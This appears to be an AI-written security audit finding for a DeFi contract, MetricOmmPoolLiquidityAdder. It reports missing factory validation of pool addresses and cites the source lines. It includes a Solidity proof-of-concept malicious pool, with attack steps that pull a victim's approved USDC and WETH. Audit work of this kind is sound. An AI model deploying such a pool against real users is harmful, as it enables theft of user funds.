Based on my analysis of the codebase, I found a concrete analog.

The key contrast is:
- `MetricOmmSimpleRouter` calls `_requireFactoryPool(pool)` on every pool before use
- `MetricOmmPoolLiquidityAdder` explicitly **skips** factory validation, as documented in its own NatSpec

---

### Title
Missing Factory Pool Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User-Approved Tokens - (File: metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol)

### Summary
`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller without verifying it against the factory registry. A malicious pool can be passed, which then calls back `metricOmmModifyLiquidityCallback` with attacker-controlled token addresses and amounts, causing the callback to pull tokens from the user (payer) directly to the malicious pool — up to the user-supplied max caps.

### Finding Description

`MetricOmmSimpleRouter` validates every pool address against the factory before use: [1](#0-0) 

`MetricOmmPoolLiquidityAdder` explicitly does **not**: [2](#0-1) 

The callback settlement path in `metricOmmModifyLiquidityCallback` only checks that `msg.sender` equals the pool stored in transient storage (which the attacker controls by supplying the malicious pool address): [3](#0-2) 

It then reads token addresses directly from the (malicious) caller: [4](#0-3) 

Because `pay()` calls `safeTransferFrom(payer, msg.sender, amount)` when `payer != address(this)`: [5](#0-4) 

the malicious pool receives the user's tokens directly.

The `addLiquidityWeighted` variant adds a second attack surface: the malicious pool can revert the probe with an inflated `LiquidityProbe(need0, need1)` to manipulate the share-scaling ratio and maximize the pull amount: [6](#0-5) 

### Impact Explanation
Direct loss of user principal. Any user who has approved `MetricOmmPoolLiquidityAdder` for a token (e.g., USDC, WETH) can have up to `maxAmountToken0` and `maxAmountToken1` of those tokens stolen in a single transaction. The malicious pool controls which tokens are pulled (via `getImmutables()`) and the amounts (via the callback arguments), bounded only by the user-supplied caps.

### Likelihood Explanation
Medium. The user must be induced to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address. This is achievable via a phishing frontend, a compromised SDK, or a malicious referral link — all realistic attack vectors for a DeFi periphery contract. No privileged access is required; any unprivileged attacker can deploy a conforming malicious pool.

### Recommendation
Add factory validation to the `pool` parameter in all public entry points of `MetricOmmPoolLiquidityAdder`, mirroring the pattern already used in `MetricOmmSwapRouterBase`:

```solidity
// In MetricOmmPoolLiquidityAdder constructor, store the factory:
IMetricOmmPoolFactory internal immutable FACTORY;

// In each public addLiquidity* function, before _addLiquidity():
if (!FACTORY.isPool(pool)) revert InvalidPool(pool);
```

This is the same guard used in `MetricOmmSwapRouterBase._requireFactoryPool` and eliminates the inconsistency between the router and the liquidity adder.

### Proof of Concept

```solidity
contract MaliciousPool {
    address immutable victim;
    address immutable usdc;
    address immutable weth;
    address immutable adder;

    constructor(address _victim, address _usdc, address _weth, address _adder) {
        victim = _victim; usdc = _usdc; weth = _weth; adder = _adder;
    }

    // Returns attacker-chosen tokens
    function getImmutables() external view returns (PoolImmutables memory imm) {
        imm.token0 = usdc;
        imm.token1 = weth;
    }

    // Called by MetricOmmPoolLiquidityAdder._addLiquidity
    function addLiquidity(address, uint80, LiquidityDelta calldata, bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Call back with KIND_PAY and max amounts — pulls victim's tokens here
        IMetricOmmPoolLiquidityAdder(adder).metricOmmModifyLiquidityCallback(
            1_000e6,   // steal 1000 USDC (≤ victim's maxAmountToken0)
            1e18,      // steal 1 WETH   (≤ victim's maxAmountToken1)
            abi.encode(uint8(1)) // KIND_PAY
        );
        return (1_000e6, 1e18);
    }
}

// Attack:
// 1. Victim approves MetricOmmPoolLiquidityAdder for USDC and WETH
// 2. Victim is tricked into calling:
adder.addLiquidityExactShares(
    address(maliciousPool),
    victim,
    0,
    deltas,
    1_000e6,  // maxAmountToken0
    1e18,     // maxAmountToken1
    ""
);
// Result: 1000 USDC and 1 WETH transferred from victim to MaliciousPool
```

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L106-115)
```text
    try IMetricOmmPoolActions(pool)
      .addLiquidity(owner, salt, weightDeltas, abi.encode(KIND_PROBE), extensionData) returns (
      uint256, uint256
    ) {
      revert WeightedProbeInconclusive();
    } catch (bytes memory reason) {
      (uint256 need0, uint256 need1) = _decodeLiquidityProbeOrBubble(reason);
      LiquidityDelta memory scaled = _scaleWeightsToShares(weightDeltas, maxAmountToken0, maxAmountToken1, need0, need1);
      return _addLiquidity(pool, owner, salt, scaled, msg.sender, maxAmountToken0, maxAmountToken1, extensionData);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-167)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L169-177)
```text
    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L85-87)
```text
    } else {
      IERC20(token).safeTransferFrom(payer, recipient, value);
    }
```
